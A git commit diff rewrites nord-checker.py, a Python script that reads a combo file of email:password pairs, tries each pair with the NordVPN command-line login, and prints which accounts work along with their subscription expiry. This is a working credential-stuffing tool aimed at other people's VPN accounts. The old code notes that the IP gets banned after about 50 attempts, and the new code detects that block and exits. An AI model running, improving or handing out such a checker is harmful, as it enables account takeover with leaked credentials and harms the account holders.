308b6e95b4c477d7e80768745005a772af2e859f
Behnam Mohammadzadeh <behnam.mohamadzadeh21@gmail.com>
2020-12-04 15:02:26 +0330

    rewrite the script, args, messages etc.

--- nord-checker.py
+++ nord-checker.py
@@ -1,55 +1,97 @@
 import os
 import subprocess
-import time
 import sys
-import getopt
+import argparse
 
-G = '\033[92m'
-W = '\033[93m'
-R = '\033[91m'
-E = '\033[0m'
+# console colors
+G = '\033[92m'  # Green
+W = '\033[93m'  # Warning (yellow)
+R = '\033[91m'  # Red
+E = '\033[0m'   # Erase (the default color)
+B = '\033[34m'  # Blue
 
-try:
-    options , args = getopt.getopt(sys.argv[1:], 'f:', 'file=')
-except getopt.GetoptError:
-    print(R + 'Argument Error' + E)
+# initiate argument parser
+parser = argparse.ArgumentParser(
+    description='Check NordVPN login'
+)
+
+# add argument to parser
+parser.add_argument(
+    '-f',
+    '--file',
+    help='The file that contains your email:pass',
+    action='store',
+    required=True,
+    metavar='file'
+)
+
+args = parser.parse_args()
+
+combo_file_path = args.file
+
+if not os.path.isfile(combo_file_path):
+    print('The path specified does not exist', combo_file_path)
     sys.exit()
-if not options:
-    print(R + 'Pass the file !' + E)
-    sys.exit()
-first_arg = options[0][0]
-first_arg_val = options[0][1]
-handle = None
-if  first_arg in ('-f','--file'):
-    if os.path.isfile(first_arg_val):
-        handle = open(first_arg_val) 
 
-count = 0 
-if handle:
-    try:
-        first_logout = subprocess.check_output(['nordvpn','logout'])
-    except:
-        pass
-    
-    for line in handle:
-        count += 1
-        user , pas = line.strip().split(':')    # your combo file must be separated by colon : 
-        res  = os.system('nordvpn login -u {} -p {}'.format(user,pas))
-        info = None
+# make sure you logged out of NordVPN
+subprocess.run(['nordvpn', 'logout'], capture_output=True)
 
-        if res == 0:  # 0 means that there is no error
-            info = str(subprocess.check_output(['nordvpn','account'],encoding='437'))
-            info = info.split('Account Information:')[1]
-            info = info.split('Email Address: ')[1]
-            email , info = info.split('VPN Service: ')
-            print(str(count)+'-' ,user+':'+pas+'\t'+info)
-            os.system('nordvpn logout')
-            print()
+with open(combo_file_path) as combo_file:
+    count = 0
 
-        else:
-            print(str(count)+'- '+user+':'+pas+'\t'+str(info)+'\n')
+    if combo_file:
+        for line in combo_file:
+            count += 1
 
-        if count == 50: # you can change the count but almost after 50 try your IP will ban from Nordvpn servers
-            handle.close()
-            print(f"We have reached to {count} login")
-            exit()
+            if not line.strip():  # ignore empty lines in file
+                continue
+
+            email, password = line.strip().split(':')    # your combo file must be separated by `:`
+
+            # making output more user friendly
+            print(B + f'{count}) Checking ➜', W + f'{email}:{password}\r' + E, end='')
+
+            login_result = subprocess.run(
+                ['nordvpn', 'login', '-u', email, '-p', password],
+                capture_output=True,
+                text=True
+            )
+
+            if not login_result.returncode == 0:
+                "This means that login was not successful"
+                print(
+                    B + f'{count}) Checking ➜',
+                    W + f'{email}:{password}',
+                    '\t\t\t',
+                    R + 'Failed' + E
+                )
+                continue
+
+            account_info = subprocess.run(
+                ['nordvpn', 'account'],
+                capture_output=True,
+                text=True
+            )
+
+            # to make sure that `nordvpn account` gives correct output
+            if 'You are not logged in.' in account_info.stdout:
+                msg = R + f"""
+                Something is wrong.
+                To prevent brute force, NordVPN blocks your IP for a while.
+                Try again later.
+                """ + E
+                print(msg)
+                sys.exit()
+
+            account_expiration_date = account_info.stdout.split('VPN Service: ')[1]
+
+            print(
+                B + f'{count}) Checking ➜',
+                W + f'{email}:{password}\t\t',
+                G + account_expiration_date.rstrip() + E
+            )
+
+            subprocess.run(
+                ['nordvpn', 'logout'],
+                capture_output=True
+            )
